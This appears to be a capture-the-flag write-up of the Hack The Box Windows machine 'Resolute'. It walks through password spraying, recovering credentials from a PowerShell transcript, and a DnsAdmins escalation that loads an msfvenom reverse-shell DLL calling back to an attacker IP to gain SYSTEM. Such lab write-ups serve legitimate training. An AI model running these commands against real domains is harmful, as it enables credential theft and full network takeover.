---
permalink: /posts/HTB/Resolute
title:  "HTB Resolute"
author: Luc Kolen
description: "Resolute is a medium Windows machine on HTB"
categories:
  - CTF
  - HTB
tags: 
  - HTB-Medium
  - Windows 
  - DNSAdmin
---
# Resolute

- [Resolute](#resolute)
  - [10.10.10.169](#101010169)
  - [NMAP Top 1000 TCP](#nmap-top-1000-tcp)
  - [Initial access](#initial-access)
  - [Shell as Melanie](#shell-as-melanie)
  - [Shell as Ryan](#shell-as-ryan)

## 10.10.10.169

## NMAP Top 1000 TCP
```
$ sudo nmap 10.10.10.169 --top-ports 1000 -sC -sV  -v -T5 -A -Pn -oA NMAP/resolute
[...
PORT     STATE SERVICE      VERSION
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-12-12 12:00:39Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
[...
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-12-12T12:00:47
|_  start_date: 2022-12-12T11:59:32
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: mean: 2h47m00s, deviation: 4h37m08s, median: 7m00s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2022-12-12T04:00:46-08:00
```

## Initial access
```
$ enum4linux 10.10.10.169
[...]
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!
[...]
```

This also resulted in a full list of usernames:

```
Administrator
Guest
krbtgt
DefaultAccount
ryan
marko
sunita
abigail
marcus
sally
fred
angela
felicia
gustavo
ulf
stevie
claire
paulo
steve
annette
annika
per
claude
melanie
zach
simon
naoki
```

```
$ crackmapexec smb 10.10.10.169 --shares -u users.txt -p 'Welcome123!'
[...]
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE
[...]
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
SMB         10.10.10.169    445    RESOLUTE         [+] Enumerated shares
SMB         10.10.10.169    445    RESOLUTE         Share           Permissions     Remark
SMB         10.10.10.169    445    RESOLUTE         -----           -----------     ------
SMB         10.10.10.169    445    RESOLUTE         ADMIN$                          Remote Admin
SMB         10.10.10.169    445    RESOLUTE         C$                              Default share
SMB         10.10.10.169    445    RESOLUTE         IPC$                            Remote IPC
SMB         10.10.10.169    445    RESOLUTE         NETLOGON        READ            Logon server share 
SMB         10.10.10.169    445    RESOLUTE         SYSVOL          READ            Logon server share
```

The credentials ended up not working for Marko's account, however they did work for Melanie's account.

## Shell as Melanie

```
$ evil-winrm -i 10.10.10.169 -u melanie -p 'Welcome123!'
[...]
*Evil-WinRM* PS C:\Users\melanie\Documents> type ../Desktop/user.txt
0503[...]a07d
```

```
*Evil-WinRM* PS C:\> ls -force

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
d--hs-        9/25/2019  10:17 AM                Recovery
d--hs-        9/25/2019   6:25 AM                System Volume Information
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows
-arhs-       11/20/2016   5:59 PM         389408 bootmgr
-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
-a-hs-       12/12/2022   3:59 AM      402653184 pagefile.sys
```

```
*Evil-WinRM* PS C:\> ls -force PSTranscripts

    Directory: C:\PSTranscripts

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--h--        12/3/2019   6:45 AM                20191203

*Evil-WinRM* PS C:\> ls -force PSTranscripts/20191203

    Directory: C:\PSTranscripts\20191203

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```

```
*Evil-WinRM* PS C:\> type PSTranscripts/20191203/PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
[...]
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
```

## Shell as Ryan

```
$ evil-winrm -i 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!'
[...]
*Evil-WinRM* PS C:\Users\ryan\Documents> dir -s ..

    Directory: C:\Users\ryan

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        12/3/2019   7:34 AM                Desktop
d-r---        9/27/2019   4:22 PM                Documents
d-r---        7/16/2016   6:18 AM                Downloads
d-r---        7/16/2016   6:18 AM                Favorites
d-r---        7/16/2016   6:18 AM                Links
d-r---        7/16/2016   6:18 AM                Music
d-r---        7/16/2016   6:18 AM                Pictures
d-----        7/16/2016   6:18 AM                Saved Games
d-r---        7/16/2016   6:18 AM                Videos

    Directory: C:\Users\ryan\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        12/3/2019   7:34 AM            155 note.txt
*Evil-WinRM* PS C:\Users\ryan\Documents> type ../Desktop/note.txt
Email to team:

- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
```

```
*Evil-WinRM* PS C:\Users\ryan\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

We can use this `MEGABANK\DnsAdmins` group.

```
$ msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.16.4 lport=80 -f dll > shell.dll
[...]
$ impacket-smbserver share $(pwd) -smb2support
```

```
*Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd.exe 127.0.0.1 /config /serverlevelplugindll \\10.10.16.4\share\shell.dll
[...]
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe stop dns
[...]
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe start dns
```

```
$ nc -lnvp 80
[...]
C:\Windows\system32>whoami
whoami
nt authority\system
[...]
C:\Windows\system32>type \users\Administrator\Desktop\root.txt
type \users\Administrator\Desktop\root.txt
f57d[...]909a
```
